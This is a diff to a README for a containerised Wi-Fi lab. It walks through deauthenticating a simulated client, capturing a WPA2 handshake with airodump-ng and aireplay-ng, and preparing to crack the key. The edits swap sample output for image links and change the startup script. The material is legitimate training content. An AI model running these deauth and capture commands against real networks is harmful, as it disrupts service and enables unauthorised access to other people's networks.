@@ -1,4 +1,4 @@
-# Wi-Fi Deauth & WPA2 Cracking Lab
+# Wi-Fi Deauth & WPA2 Cracking Guide
 
 A step-by-step guide for performing a deauthentication attack, capturing a WPA2 4-way handshake, cracking the PSK, and decrypting traffic — all inside a `mac80211_hwsim`-based Docker lab with three containers: `ap`, `client`, and `attacker`.
 
@@ -31,10 +31,11 @@ A step-by-step guide for performing a deauthentication attack, capturing a WPA2 
 
 ## Prerequisites
 
-Bring the lab up:
+Start the initialization script:
 
 ```bash
-docker compose up -d
+chmod +x start.sh
+./start.sh
 ```
 
 Confirm all three containers are running:
@@ -44,6 +45,10 @@ docker ps
 ```
 
 You should see `ap`, `client`, and `attacker`.
+
+![alt text](images/image0.png)
+
+![alt text](images/image0.1.png)
 
 ---
 
@@ -55,11 +60,17 @@ Verify each interface is in the expected state.
 # AP should report type AP, channel 6, ssid TestWiFi
 docker exec ap iw dev wlan0 info
 
+![alt text](images/image1.1.png)
+
 # Client should report "Connected to 02:00:00:00:00:00, SSID: TestWiFi"
 docker exec client iw dev wlan1 link
 
+![alt text](images/image1.2.png)
+
 # Attacker should report type monitor, channel 6
 docker exec attacker iw dev wlan2 info
+
+![alt text](images/image1.3.png)
 ```
 
 Confirm the aircrack-ng suite is installed inside the attacker:
@@ -116,23 +127,13 @@ airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w handshake wlan2
 
 You should see the AP and the associated client appear:
 
-```
-CH  6 ][ Elapsed: 5 s ][ ... ][ WPA handshake:
-
- BSSID              PWR  Beacons   #Data  CH  ENC   CIPHER  AUTH  ESSID
- 02:00:00:00:00:00  -20      125       0   6  WPA2  CCMP    PSK   TestWiFi
-
- BSSID              STATION            PWR   Rate   Frames
- 02:00:00:00:00:00  02:00:00:00:01:00  -25   0-1    24
-```
+![alt text](images/image3.1.png)
 
 **Leave this running.** When a handshake is captured the header will show:
 
 ```
 CH  6 ][ ... ][ WPA handshake: 02:00:00:00:00:00
 ```
-
-> `airodump-ng` is purely passive — it reads frames off the monitor interface and updates tables. It transmits nothing.
 
 ---
 
@@ -156,11 +157,7 @@ aireplay-ng --deauth 5 \
 
 Expected output:
 
-```
-Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0|62 ACKs]
-Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0|63 ACKs]
-...
-```
+![alt text](images/image4.1.png)
 
 ### What is happening under the hood
 
@@ -184,6 +181,7 @@ Look back at **Terminal A**. The top of the screen should now show:
 ```
 CH  6 ][ Elapsed: 1 min ][ ... ][ WPA handshake: 02:00:00:00:00:00
 ```
+![alt text](images/image5.1.png)
 
 That phrase appears the moment all four EAPOL messages of a complete handshake are in the capture file.
 
@@ -202,15 +200,9 @@ You should see:
    1  02:00:00:00:00:00  TestWiFi   WPA (1 handshake)
 ```
 
+![alt text](images/image5.2.png)
+
 **"WPA (1 handshake)"** is what you want. Press Ctrl+C — we'll crack it in the next step.
-
-If you instead see *"no handshake"*, re-run the deauth in Step 4 and try again. You can also inspect the EAPOL frames directly:
-
-```bash
-tcpdump -r /tmp/capture/handshake-01-dec.cap -nn 'icmp or arp' | head -30
-```
-
-You should see messages 1 through 4.
 
 ---
 
